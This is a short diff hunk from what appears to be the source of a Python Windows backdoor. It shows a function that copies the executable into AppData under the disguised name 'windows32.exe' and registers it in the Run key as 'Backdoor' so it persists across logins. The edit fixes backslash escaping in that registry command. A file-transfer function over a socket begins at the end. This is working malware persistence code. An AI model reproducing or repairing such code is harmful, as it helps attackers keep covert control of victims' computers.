@@ -17,7 +17,7 @@ def registry():
     location = os.environ['appdata']+'\\windows32.exe'
     if not os.path.exists(location):
         shutil.copyfile(sys.executable, location)
-        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'+ location + '"', shell=True)
+        subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'+ location + '"', shell=True)
 
 def transfer(s, path):
     if os.path.exists(path):
